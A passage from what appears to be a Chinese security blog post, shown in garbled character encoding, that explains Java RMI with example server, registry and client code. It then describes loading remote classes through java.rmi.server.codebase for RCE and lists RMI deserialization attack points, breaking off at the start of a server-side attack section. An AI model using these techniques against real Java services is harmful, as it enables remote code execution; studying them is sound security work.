mathematica">å½“<span class="hljs-variable">Client</span>è¯•å›¾è°ƒç”¨ä¸€ä¸ªè¿œç«¯çš„<span class="hljs-variable">Object</span>ï¼Œå®é™…è°ƒç”¨çš„æ˜¯å®¢æˆ·ç«¯æœ¬åœ°çš„ä¸€ä¸ªä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Stub</span>ï¼‰<br><br>è°ƒç”¨<span class="hljs-variable">Server</span>çš„ç›®æ ‡ç±»ä¹‹å‰ï¼Œä¼šç»è¿‡ä¸€ä¸ªè¿œç«¯ä»£ç†ç±»ï¼ˆå°±æ˜¯<span class="hljs-built_in">Skeleton</span>ï¼‰ï¼Œå®ƒä»<span class="hljs-built_in">Stub</span>æ¥æ”¶è¿œç¨‹æ–¹æ³•è°ƒç”¨å¹¶ä¼ é€’ç»™çœŸæ­£çš„ç›®æ ‡ç±»<br><br><span class="hljs-built_in">Stub</span>å’Œ<span class="hljs-built_in">Skeleton</span>çš„è°ƒç”¨å¯¹äº<span class="hljs-variable">RMI</span>æœåŠ¡çš„ä½¿ç”¨è€…æ˜¯éšè—çš„<br></code></pre></td></tr></table></figure><p><img src="/2024/07/18/RMI-JNDI/1.png" alt="1"></p><p><img src="/2024/07/18/RMI-JNDI/2.png" alt="2"></p><p><strong>ä»£ç è§„åˆ™</strong></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">å®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯éƒ½éœ€å®šä¹‰ç”¨äºè¿œç¨‹è°ƒç”¨çš„æ¥å£<br><br>æ¥å£å¿…é¡»ç»§æ‰¿`java.rmi.Remote`æ¥å£<br><br>æ¥å£ä¸­çš„æ–¹æ³•éƒ½è¦æŠ›å‡º`java.rmi.RemoteException`å¼‚å¸¸<br><br>æœåŠ¡ç«¯åˆ›å»ºæ¥å£å®ç°ç±»ï¼Œå®ç°æ¥å£å®šä¹‰çš„æ–¹æ³•<br><br>å®ç°ç±»ç»§æ‰¿`java.rmi.server.UnicastRemoteObject`<br></code></pre></td></tr></table></figure><p>è¿™é‡Œè¦æ±‚å®ç°ç±»ç»§æ‰¿<code>UnicastRemoteObject</code>ï¼Œæ–¹ä¾¿è‡ªåŠ¨å°†è¿™ä¸ªè¿œç¨‹å¯¹è±¡å¯¼å‡ºä¾›å®¢æˆ·ç«¯è°ƒç”¨</p><p>å½“ç„¶ä¸ç»§æ‰¿ä¹Ÿè¡Œï¼Œä½†åé¢å¾—æ‰‹åŠ¨è°ƒç”¨<code>UnicastRemoteObject#exportObject</code>ï¼Œå¯¼å‡ºå¯¹è±¡æ—¶å¯ä»¥æŒ‡å®šç›‘å¬ç«¯å£æ¥æ¥æ”¶<code>incoming calls</code>ï¼Œé»˜è®¤ä¸ºéšæœºç«¯å£ã€‚ç”±ä¸Šå›¾å¯çŸ¥è¿œç¨‹å¯¹è±¡ä¼šè¢«æ³¨å†Œåˆ°<code>RMI Registry</code>ä¸­ï¼Œæ‰€ä»¥å®é™…ä¸Šä¸éœ€è¦é€šè¿‡æ³¨å†Œä¸­å¿ƒï¼Œåªè¦æˆ‘ä»¬çŸ¥é“å¯¼å‡ºçš„è¿œç¨‹å¯¹è±¡ç›‘å¬çš„ç«¯å£å·ï¼Œä¹Ÿå¯ä»¥å’Œå®ƒç›´æ¥é€šä¿¡ã€‚</p><p><code>RMI Registry</code>æ³¨å†Œä¸­å¿ƒå­˜å‚¨ç€è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰å’Œå…¶ç»‘å®šçš„åç§°ï¼ˆNameï¼‰ï¼Œå®¢æˆ·ç«¯é€šè¿‡åç§°æ‰¾åˆ°è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼ˆReferenceï¼‰ï¼Œå†ç”±è¿™ä¸ªå¼•ç”¨å°±å¯ä»¥è°ƒç”¨åˆ°è¿œç¨‹å¯¹è±¡äº†ã€‚</p><h2 id="æ­¥éª¤ä»£ç "><a href="#æ­¥éª¤ä»£ç " class="headerlink" title="æ­¥éª¤ä»£ç "></a>æ­¥éª¤ä»£ç </h2><p><strong>Server</strong></p><p>éœ€è¦è¿œç¨‹è°ƒç”¨çš„æ¥å£ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥å£å®ç°ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteObject</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteObject</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello My Friend&quot;</span>;<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(Object name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> name.getClass().getName();<br>&#125;<br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Bye&quot;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬é€šå¸¸ä½¿ç”¨ <code>LocateRegistry#createRegistry()</code> æ–¹æ³•æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Registry</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span> &#123;<br><span class="hljs-keyword">try</span> &#123;<br>LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>System.out.println(<span class="hljs-string">&quot;Server Start&quot;</span>);<br>&#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>e.printStackTrace();<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†å¾…è°ƒç”¨çš„ç±»è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteServer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br><span class="hljs-comment">// åˆ›å»ºè¿œç¨‹å¯¹è±¡</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br><span class="hljs-comment">// ç»‘å®š</span><br>Naming.bind(<span class="hljs-string">&quot;rmi://localhost:1099/Hello&quot;</span>, remoteObject);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¹Ÿå¯ä»¥ç›´æ¥æ•´åˆåˆ°Serverå¤„æ³¨å†Œè¿œç¨‹å¯¹è±¡ï¼Œä½¿ç”¨<code>LocateRegistry#createRegistry()</code>æ¥åˆ›å»ºæ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#bind()</code>è¿›è¡Œç»‘å®šï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObject</span>();<br>        Naming.bind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Naming æä¾›äº†æŸ¥è¯¢ï¼ˆlookupï¼‰ã€ç»‘å®šï¼ˆbindï¼‰ã€é‡æ–°ç»‘å®šï¼ˆrebindï¼‰ã€æ¥è§¦ç»‘å®šï¼ˆunbindï¼‰ã€listï¼ˆåˆ—è¡¨ï¼‰ç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œã€‚ä¹Ÿå°±æ˜¯è¯´ï¼ŒNaming æ˜¯ä¸€ä¸ªç”¨æ¥å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œçš„ç±»ã€‚è€Œè¿™äº›æ–¹æ³•çš„å…·ä½“å®ç°ï¼Œå…¶å®æ˜¯è°ƒç”¨ <code>LocateRegistry.getRegistry</code> æ–¹æ³•è·å–äº† Registry æ¥å£çš„å®ç°ç±»ï¼Œå¹¶è°ƒç”¨å…¶ç›¸å…³æ–¹æ³•è¿›è¡Œå®ç°çš„ã€‚</p><p>è¿™äº›æ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½æ¥æ”¶ä¸€ä¸ªURLå­—ç¬¦ä¸²ï¼Œ<code>rmi://host:port/name</code>ï¼Œè¡¨ç¤ºæ³¨å†Œä¸­å¿ƒæ‰€åœ¨ä¸»æœºå’Œç«¯å£ï¼Œè¿œç¨‹å¯¹è±¡å¼•ç”¨çš„åç§°ã€‚</p><p>ä¸€èˆ¬æ³¨å†Œä¸­å¿ƒå’ŒæœåŠ¡ç«¯éƒ½åœ¨åŒä¸€ä¸»æœºã€‚</p><p><strong>Client</strong></p><p>å®¢æˆ·ç«¯ä¹Ÿéœ€è¦å®šä¹‰å’ŒæœåŠ¡ç«¯ç›¸åŒçš„è¿œç¨‹æ¥å£ï¼Œç„¶åè¿›è¡Œè°ƒç”¨ï¼š</p><p><code>LocateRegistry#getRegistry()</code>è¿æ¥æ³¨å†Œä¸­å¿ƒï¼Œ<code>Registry#lookup()</code>è·å–è¿œç¨‹å¯¹è±¡çš„å­˜æ ¹ï¼Œé€šè¿‡åç§°æŸ¥æ‰¾ã€‚æ³¨å†Œä¸­å¿ƒé»˜è®¤ç«¯å£1099</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NotBoundException &#123;<br><span class="hljs-comment">// sun.rmi.registry.RegistryImpl_Stub</span><br><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>System.out.println(Arrays.toString(registry.list()));<br><span class="hljs-comment">// lookup and call</span><br><span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>System.out.println(stub.sayHello());<br>System.out.println(stub.sayGoodbye());<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œ RemoteInterface æ¥å£åœ¨ Client&#x2F;Server&#x2F;Registry å‡åº”è¯¥å­˜åœ¨ï¼Œåªä¸è¿‡é€šå¸¸ Registry ä¸ Server é€šå¸¸åœ¨åŒä¸€ç«¯ä¸Šã€‚</p><p>RMIæ”¯æŒåŠ¨æ€ç±»åŠ è½½æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚ä¸Šé¢çš„è¿œç¨‹æ–¹æ³•è°ƒç”¨æ¶‰åŠæ–¹æ³•å‚æ•°çš„ä¼ é€’ï¼Œè‹¥å®¢æˆ·ç«¯ä¼ é€’äº†ä¸€ä¸ªæœåŠ¡ç«¯ä¸å­˜åœ¨çš„ç±»å¯¹è±¡ï¼ŒæœåŠ¡ç«¯å¦‚ä½•è¿›è¡Œååºåˆ—åŒ–å‘¢ï¼Ÿ</p><p>æœ€åè¿˜æœ‰ä¸ªå°trickï¼Œé¦–å…ˆæ˜¯åŠ¨æ€ç±»åŠ è½½ï¼Œå¦‚æœå®¢æˆ·ç«¯åœ¨è°ƒç”¨æ—¶ï¼Œä¼ é€’äº†ä¸€ä¸ªå¯åºåˆ—åŒ–å¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åœ¨æœåŠ¡ç«¯ä¸å­˜åœ¨ï¼Œåˆ™åœ¨æœåŠ¡ç«¯ä¼šæŠ›å‡º ClassNotFound çš„å¼‚å¸¸ï¼Œä½†æ˜¯ RMI æ”¯æŒåŠ¨æ€ç±»åŠ è½½ï¼Œè‹¥è®¾ç½®äº†<code>java.rmi.server.codebase</code>ï¼Œåˆ™æœåŠ¡ç«¯ä¼šå°è¯•ä»å…¶åœ°å€è·å– <code>.class</code> å¹¶åŠ è½½åŠååºåˆ—åŒ–ã€‚åŠ è½½å­—èŠ‚ç ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.setProperty(<span class="hljs-string">&quot;java.rmi.server.codebase&quot;</span>, <span class="hljs-string">&quot;http://127.0.0.1:9999/&quot;</span>);<br></code></pre></td></tr></table></figure><p><strong>æ‰€ä»¥ï¼Œæ‰“ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œæ¶æ„Serverç«¯å¯ä»¥å¦‚æ­¤å­˜æ”¾æ¶æ„classå­—èŠ‚ç ï¼Œè®©Clientæ¥è°ƒç”¨ä»è€ŒRCEã€‚</strong></p><p>å¯ä½¿ç”¨ <code>System.setProperty(&quot;java.rmi.server.codebase&quot;, &quot;http://127.0.0.1:9999/&quot;);</code> è¿›è¡Œè®¾ç½®ï¼Œæˆ–ä½¿ç”¨å¯åŠ¨å‚æ•° <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:9999/&quot;</code> è¿›è¡ŒæŒ‡å®šã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯å®‰å…¨ç­–ç•¥çš„è®¾ç½®ï¼Œå› ä¸ºæˆ‘ä»¬é€šè¿‡ç½‘ç»œåŠ è½½å¤–éƒ¨ç±»å¹¶æ‰§è¡Œæ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¿…é¡»è¦æœ‰ä¸€ä¸ªå®‰å…¨ç®¡ç†å™¨æ¥è¿›è¡Œç®¡ç†ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½®å®‰å…¨ç®¡ç†ï¼Œåˆ™ RMI ä¸ä¼šåŠ¨æ€åŠ è½½ä»»ä½•ç±»ï¼Œé€šå¸¸æˆ‘ä»¬ä½¿ç”¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span>) &#123;<br>    System.setSecurityManager(<span class="hljs-keyword">new</span> <span class="hljs-title class_">RMISecurityManager</span>());<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®¡ç†å™¨åº”ä¸ç®¡ç†ç­–ç•¥ç›¸è¾…ç›¸æˆï¼Œæ‰€ä»¥æˆ‘ä»¬è¿˜éœ€è¦æä¾›ä¸€ä¸ªç­–ç•¥æ–‡ä»¶ï¼Œé‡Œé¢é…ç½®å…è®¸é‚£äº›ä¸»æœºè¿›è¡Œå“ªäº›æ“ä½œï¼Œè¿™é‡Œä¸ºäº†æ–¹ä¾¿æµ‹è¯•ï¼Œç›´æ¥è®¾ç½®å…¨éƒ¨æƒé™ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">grant &#123;<br>    permission java.security.AllPermission;<br>&#125;;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥ä½¿ç”¨ <code>-Djava.security.policy=rmi.policy</code> æˆ– <code>System.setProperty(&quot;java.security.policy&quot;, RemoteServer.class.getClassLoader().getResource(&quot;rmi.policy&quot;).toString());</code> æ¥è¿›è¡Œè®¾ç½®ã€‚</p><h2 id="RMIåº•å±‚åŸç†æ€»ç»“"><a href="#RMIåº•å±‚åŸç†æ€»ç»“" class="headerlink" title="RMIåº•å±‚åŸç†æ€»ç»“"></a>RMIåº•å±‚åŸç†æ€»ç»“</h2><p>å¯¹äºæ›´åº•å±‚éƒ¨åˆ†çš„åˆ†ææˆ‘å°±ä¸çŒ®ä¸‘ï¼Œç½‘ä¸Šå¾ˆå¤šå¤§ç‰›éƒ½å†™å¾—å¾ˆé€å½»æ¸…æ™°ï¼Œè¿™é‡Œæˆ‘å°±åªå†™å†™RMI-Attackè¡Œä¸ºäº†ã€‚</p><p>åº•å±‚åŸç†å¯ä»¥æ€»ç»“ä¸ºï¼ˆå€Ÿç”¨su18ä½¬çš„å›¾å›¾ï¼‰ï¼š</p><p><img src="/2024/07/18/RMI-JNDI/3.png" alt="3"></p><p>æ€»è€Œè¨€ä¹‹ï¼ŒRMI åº•å±‚é€šè®¯é‡‡ç”¨äº†Stub (è¿è¡Œåœ¨å®¢æˆ·ç«¯) å’Œ Skeleton (è¿è¡Œåœ¨æœåŠ¡ç«¯) æœºåˆ¶ï¼ŒRMI è°ƒç”¨è¿œç¨‹æ–¹æ³•çš„å¤§è‡´å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-number">1</span>ã€RMI å®¢æˆ·ç«¯åœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ä¼šå…ˆåˆ›å»º Stub ( sun.rmi.registry.RegistryImpl_Stub )ã€‚<br><span class="hljs-number">2</span>ã€Stub ä¼šå°† Remote å¯¹è±¡ä¼ é€’ç»™è¿œç¨‹å¼•ç”¨å±‚ ( java.rmi.server.RemoteRef ) å¹¶åˆ›å»º java.rmi.server.RemoteCall( è¿œç¨‹è°ƒç”¨ )å¯¹è±¡ã€‚<br><span class="hljs-number">3</span>ã€RemoteCall åºåˆ—åŒ– RMI æœåŠ¡åç§°ã€Remote å¯¹è±¡ã€‚<br><span class="hljs-number">4</span>ã€RMI å®¢æˆ·ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ä¼ è¾“ RemoteCall åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡ Socket è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ° RMI æœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚ã€‚<br><span class="hljs-number">5</span>ã€RMIæœåŠ¡ç«¯çš„è¿œç¨‹å¼•ç”¨å±‚( sun.rmi.server.UnicastServerRef )æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™ Skeleton ( sun.rmi.registry.RegistryImpl_Skel#dispatch )ã€‚<br><span class="hljs-number">6</span>ã€Skeleton è°ƒç”¨ RemoteCall ååºåˆ—åŒ– RMI å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚<br><span class="hljs-number">7</span>ã€Skeleton å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼šbindã€listã€lookupã€rebindã€unbindï¼Œå¦‚æœæ˜¯ lookup åˆ™æŸ¥æ‰¾ RMI æœåŠ¡åç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡ RemoteCall ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">9</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ã€‚<br><span class="hljs-number">10</span>ã€RMI å®¢æˆ·ç«¯è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼ŒRMIæœåŠ¡ç«¯åå°„è°ƒç”¨RMIæœåŠ¡å®ç°ç±»çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚<br><span class="hljs-number">11</span>ã€RMI å®¢æˆ·ç«¯ååºåˆ—åŒ– RMI è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚<br></code></pre></td></tr></table></figure><h2 id="RMI-Attack"><a href="#RMI-Attack" class="headerlink" title="RMI-Attack"></a>RMI-Attack</h2><p>è¿™é‡Œæˆ‘è§‰å¾—su18ä½¬çš„ç”µè¯æœ¬æ¯”å–»å¾ˆæ°å½“ä¹Ÿå¾ˆæ˜“æ‡‚ï¼ŒJava RMI è®¾è®¡äº†ä¸€ä¸ª Registry çš„æ€æƒ³ï¼Œå¾ˆå¥½ç†è§£ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ³¨å†Œè¡¨æ¥æŸ¥æ‰¾ä¸€ä¸ªè¿œç«¯å¯¹è±¡çš„å¼•ç”¨ï¼Œæ›´é€šä¿—çš„æ¥è®²ï¼Œè¿™ä¸ªå°±æ˜¯ä¸€ä¸ª RMI ç”µè¯æœ¬ã€‚</p><p>æˆ‘ä»¬æƒ³åœ¨æŸä¸ªäººé‚£é‡Œè·å–ä¿¡æ¯æ—¶ï¼ˆRemote Method Invocationï¼‰ï¼Œæˆ‘ä»¬åœ¨ç”µè¯æœ¬ä¸Šï¼ˆRegistryï¼‰é€šè¿‡è¿™ä¸ªäººçš„åç§° ï¼ˆNameï¼‰æ¥æ‰¾åˆ°è¿™ä¸ªäººçš„ç”µè¯å·ç ï¼ˆReferenceï¼‰ï¼Œå¹¶é€šè¿‡è¿™ä¸ªå·ç æ‰¾åˆ°è¿™ä¸ªäººï¼ˆRemote Objectï¼‰ã€‚</p><p>å‚ä¸ä¸€æ¬¡ RMI è°ƒç”¨çš„æœ‰ä¸‰ä¸ªè§’è‰²ï¼Œåˆ†åˆ«æ˜¯ Server ç«¯ï¼ŒRegistry ç«¯å’Œ Client ç«¯ã€‚ä¸¥æ ¼æ„ä¹‰ä¸Šæ¥è®²ï¼Œåªæœ‰ Registry ç«¯å’Œä½¿ç”¨ Registry çš„ç«¯ï¼Œå› ä¸º Registry ç«¯åªè´Ÿè´£æŸ¥è¯¢å’Œä¼ é€’å¼•ç”¨ï¼ŒçœŸæ­£çš„æ–¹æ³•è°ƒç”¨æ˜¯ä¸éœ€è¦ç»è¿‡ Registry ç«¯çš„ï¼Œåªä¸è¿‡æ³¨å†ŒæœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Server ç«¯ï¼Œä½¿ç”¨æœåŠ¡çš„æˆ‘ä»¬ç§°ä¹‹ä¸º Client ç«¯ã€‚</p><p><strong>æœ‰ä¸€ç§æˆ‘åªè´Ÿè´£å¸®ä½ æ‰¾åˆ°äººï¼Œè‡³äºä½ æ‰¾è¿™ä¸ªäººåšä»€ä¹ˆéæ³•å‹¾å½“æˆ‘ä¸ç®¡çš„æ„Ÿè§‰</strong>ï¼Œä¸è¿‡ä¸ºäº†æ›´æ¸…æ™°çš„åˆ’åˆ†ä¸åŒè§’è‰²ï¼Œæˆ‘ä»¬è¿˜æ˜¯å°†å…¶åˆ†ä¸ºä¸‰ä¸ªè§’è‰²ï¼Œè€Œé€šå¸¸æƒ…å†µä¸‹ï¼ŒServer ç«¯å’Œ Registry ç«¯æ˜¯åŒä¸€ç«¯ã€‚</p><p>RMIè°ƒç”¨è¿‡ç¨‹å†³å®šäº†ä¸‰è€…éƒ½æ¶‰åŠååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¯¹è¿™ä¸‰è€…çš„æ”»å‡»å°±å‘¼ä¹‹æ¬²å‡ºã€‚</p><p>å¤§æ¦‚åˆ†è¿™å‡ ç§ï¼š</p><ol><li>æ”»å‡»å®¢æˆ·ç«¯<ul><li>RegistryImp_Stub#lookup ååºåˆ—åŒ–æ³¨å†Œä¸­å¿ƒè¿”å›çš„Stub</li><li>UnicastRef#invoke ååºåˆ—åŒ–è¿œè°ƒæ–¹æ³•çš„æ‰§è¡Œç»“æœ</li><li>StreamRemoteCall#executeCall ååºåˆ—åŒ–è¿œç¨‹è°ƒç”¨è¿”å›çš„å¼‚å¸¸ç±»</li><li>DGCImpl_Stub#dirty</li></ul></li><li>æ”»å‡»æœåŠ¡ç«¯<ul><li>UnicastServerRef#dispatch ååºåˆ—åŒ–å®¢æˆ·ç«¯ä¼ é€’çš„æ–¹æ³•å‚æ•°</li><li>DGCImpl_Skel#dispatch</li></ul></li><li>æ”»å‡»æ³¨å†Œä¸­å¿ƒ<ul><li>RegistryImp_Stub#bind æ³¨å†Œä¸­å¿ƒååºåˆ—åŒ–æœåŠ¡ç«¯ä¼ é€’ä¼ æ¥çš„è¿œç¨‹å¯¹è±¡</li></ul></li></ol><h3 id="Server-ç«¯-Attack"><a href="#Server-ç«¯-Attack" class="headerlink" title="Server ç«¯ Attack"></a>Server ç«¯ Attack</h3><h4 id="æ¶æ„æœåŠ¡å‚æ•°"><a href="#æ¶æ„æœåŠ¡å‚æ•°" class="headerlink" title="æ¶æ„æœåŠ¡å‚æ•°"></a>æ¶æ„æœåŠ¡å‚æ•°</h4><p>è¿™é‡Œéœ€è¦ä¸€ä¸ªèƒŒæ™¯ï¼Œå½“ Client ç«¯è·å–åˆ° Server ç«¯åˆ›å»ºçš„ Stub åï¼ŒClient ä¼šåœ¨æœ¬åœ°è°ƒç”¨è¿™ä¸ª Stub å¹¶ä¼ é€’å‚æ•°ï¼ŒStub ä¼šåºåˆ—åŒ–è¿™ä¸ªå‚æ•°å¹¶ä¼ é€’ç»™ Server ç«¯ï¼Œ<strong>Server ç«¯å°±ä¼šååºåˆ—åŒ– Client 